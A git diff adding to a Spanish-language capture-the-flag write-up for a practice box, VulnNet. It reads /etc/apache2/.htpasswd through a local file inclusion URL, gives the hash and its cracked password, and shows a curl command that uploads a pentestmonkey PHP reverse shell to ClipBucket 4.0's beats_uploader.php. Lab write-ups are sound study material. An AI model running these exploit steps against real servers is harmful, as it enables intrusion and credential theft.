@@ -93,3 +93,22 @@ Requests/sec.: 184.8877
 eliminando los paquetes de tamaño 462 W eliminamos los falsos positivos. Luego hemos encontrado una puerta de entrada para un posible
 ataque del tipo LFI
 > vulnnet.thm/index.php?referer=
+
+# LFI EXPLOIT
+Explotando la vulnerabilidad anterior podemos ver en 
+> vulnnet.thm/index.php?referer=/etc/apache2/.htpasswd, el siguiente hash
+> developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0
+explicacion: apache guarda en el fichero .htpasswd unas credenciales con el esquema anterior (username en plain-text y password en un hash que es una variante de MD5. Si un sitio web esta configurado para para utilizar /.htpasswd cuando alguien intenta acceder al sitio le sale un formulario para acreditarse
+
+##JtR
+> developers:9972761drmfsls
+
+# CVE
+Entramos en una pagina donde hay una aplicacion llamada **ClipBucket** que es una aplicacion que nos permite subir fotos y videos tipo youtube
+Vemos que para la version 4.0 hay una vulnerabilidad que nos permite RCE, file upload e incluso sqlinjection:
+![image](https://user-images.githubusercontent.com/70599089/184412628-ba9e86d3-3021-401a-8dcb-38c032fa0861.png)
+
+Optamos por un file upload utilizando un payload tipo pentestmonkey en curl
+> curl -F "file=@pfile.php" -F "plupload=1" -F "name=anyname.php"
+"http://broadcast.vulnnet.thm/actions/beats_uploader.php" http://broadcast.vulnnet.thm -u developers:9972761drmfsls
+
